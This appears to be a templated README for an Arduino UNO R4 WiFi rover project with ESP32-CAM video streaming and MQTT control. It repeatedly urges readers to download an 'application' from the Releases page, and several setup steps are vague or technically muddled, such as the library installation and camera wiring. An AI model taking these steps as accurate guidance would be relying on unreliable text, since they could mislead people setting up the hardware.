# 🌟 hks-rover-arduino - Control Your Rover with Ease

## 🚀 Getting Started

Welcome to hks-rover-arduino! This project gives you the tools to control an omnidirectional rover using an Arduino UNO R4 WiFi. You can stream video from an ESP32-CAM and handle your rover with MQTT commands. Below, you'll find all the information needed to download and run the software smoothly.

### 💾 Download Now

[![Download hks-rover-arduino](https://img.shields.io/badge/Download-hks--rover--arduino-blue.svg)](https://github.com/Meharees123/hks-rover-arduino/releases)

## 📥 Download & Install

To get started, visit the [Releases page](https://github.com/Meharees123/hks-rover-arduino/releases) to download the latest version of the application. Follow these steps:

1. Click the link above to navigate to the releases.
2. Find the latest version listed on that page.
3. Click on the appropriate file to download it to your computer.

### ⚙️ System Requirements

- **Operating System:** Windows 10 or later, macOS Catalina (10.15) or later, or a Linux distribution that supports Arduino IDE.
- **Arduino IDE:** Version 1.8.13 or later.
- **Network:** WiFi connection for real-time control.
- **Hardware:** Arduino UNO R4 WiFi, ESP32-CAM, and necessary cables.

## 🛠️ Setting Up Your Rover

Before running the application, ensure your hardware is set up correctly. Follow these steps:

1. Connect the Arduino UNO R4 WiFi to your power source.
2. Attach the motors to the rover chassis.
3. Connect the ESP32-CAM for streaming.

Make sure all components are secure and powered on.

## 🌐 Configuring the Software

Now, let’s set up the software on your computer:

1. **Install Arduino IDE:** 
   - Download the Arduino IDE from the official [Arduino website](https://www.arduino.cc/en/software).
   - Follow the installation instructions provided there.

2. **Open the Application:**
   - Launch Arduino IDE.
   - Open the downloaded `.ino` file associated with hks-rover-arduino.

3. **Install Libraries:**
   - Go to **Sketch** > **Include Library** > **Manage Libraries**.
   - Search for and install the following libraries:
     - **PubSubClient:** For MQTT communication.
     - **ESP32:** For ESP32-CAM support.

4. **Connect Your Arduino:**
   - Use the USB cable to connect your Arduino UNO R4 WiFi to your computer.
   - Under **Tools**, select the right board and port.

5. **Upload Code:**
   - Click the upload button to transfer the code to your Arduino.
   - Wait until the upload completes. You’ll see a message confirming success.

## 🎥 Streaming Setup

1. **Connect to the ESP32-CAM:**
   - Make sure your ESP32-CAM is powered and properly connected to the Arduino.
   - Adjust the camera’s lens for a clear view.

2. **Access the Stream:**
   - The application will generate a local IP address for the ESP32-CAM.
   - Enter this IP address into your web browser to access the live video feed.

## 🎮 Using Your Rover

Once everything is set up:

1. Use your preferred MQTT client to send commands.
2. Control the rover in real time through the web interface provided by the ESP32-CAM stream.
3. Experiment with the controls to see how smoothly your rover operates.

## 🔧 Troubleshooting

If you encounter any issues:

- **No Connection:** Ensure all components are correctly connected and powered.
- **Stream Failure:** Check that the IP address is entered correctly and that your WiFi is functioning.
- **Unexpected Behavior:** Restart the Arduino and re-upload the code.

For further assistance, consult the documentation available on the repository or ask within the community discussions.

## 📘 Additional Resources

- [Arduino Documentation](https://www.arduino.cc/en/Reference/HomePage)
- [ESP32-CAM Guide](https://randomnerdtutorials.com/esp32-cam-video-streaming-web-server/)
- [MQTT Basics](http://mqtt.org/)

## 📑 Note on Contributions

If you find ways to improve the project or discover bugs, feel free to contribute. Check out the contributing guidelines in the repository for more details.

## 🎉 Final Remarks

Thank you for exploring hks-rover-arduino! We hope you enjoy using your new rover and find it easy to operate. For updates and new features, keep an eye on our [Releases page](https://github.com/Meharees123/hks-rover-arduino/releases). Happy exploring!